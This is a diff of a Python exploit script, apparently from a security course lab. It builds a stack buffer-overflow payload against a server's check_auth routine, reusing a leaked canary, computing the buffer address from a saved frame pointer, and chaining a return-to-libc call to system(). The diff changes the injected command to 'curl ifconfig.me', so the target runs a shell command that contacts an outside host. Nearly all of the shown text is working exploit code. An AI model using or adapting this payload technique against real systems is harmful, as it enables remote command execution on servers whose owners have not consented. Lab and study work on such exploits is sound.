@@ -40,15 +40,14 @@ def main():
 	canary = canary.replace('00','3D')
 
 
-	string = "/secet/x" 
-	path_string = string.encode("utf-8").hex().replace('0x','').upper()
-	num_bytes = 13*4 - len(string)
-	payload = path_string + "3D"*(num_bytes)
 
+	num_bytes = 13*4
+	payload = "3D"*(num_bytes)
 
 	# saved ebp of check_auth - post_data buffer address = 136
-	t = int(saved_ebp, 16) - 136
-	t = hex(t).replace('0x','').upper()
+	buffer_address = int(saved_ebp, 16) - 136
+	t = hex(buffer_address).replace('0x','').upper()
+	print("Buffer address = ", t)
 	payload += little_to_big_endian_conversion(t)
 
 	# 1 random word = 4 random bytes
@@ -67,15 +66,19 @@ def main():
 	t = hex(system_address).replace('0x','').upper()
 	payload += little_to_big_endian_conversion(t)
 
-	exit_address = system_address - 54976 
-	temp_string = hex(exit_address).replace('0x','').upper()
-	payload += little_to_big_endian_conversion(temp_string)
-
-	# saved ebp of check_auth - post_data buffer address = 136
-	t = int(saved_ebp, 16) - 136
-	t = hex(t).replace('0x','').upper()
+	argument_address = buffer_address + 88
+	t = hex(argument_address).replace('0x','').upper()
 	payload += little_to_big_endian_conversion(t)
 
+	argument_address = buffer_address + 88
+	t = hex(argument_address).replace('0x','').upper()
+	payload += little_to_big_endian_conversion(t)
+
+
+	string = "curl ifconfig.me" 
+	path_string = string.encode("utf-8").hex().replace('0x','').upper()
+
+	payload += path_string
 
 	store_payload_binary(payload+"00000000")
 
